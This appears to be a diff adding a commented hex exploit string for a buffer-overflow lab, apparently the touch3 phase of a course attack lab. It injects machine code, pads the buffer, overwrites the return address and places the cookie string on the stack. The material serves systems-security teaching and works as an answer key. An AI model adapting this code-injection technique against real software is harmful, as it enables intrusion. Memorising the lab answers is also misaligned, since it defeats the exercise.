@@ -1,0 +1,17 @@
+/* cookie address is rsp + 0x10 */
+48 c7 c7 40 c9 65 55 c3
+
+/* buffer is hex to dec, pad remaining with 0's */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* %rsp minus buffer length 0x28 in hexadecimal */
+08 c9 65 55 00 00 00 00
+
+/* touch3 address */
+1f 16 40 00 00 00 00 00
+
+/* cookie value from ASCII to hexadecimal */
+37 66 65 66 39 31 31 62 00
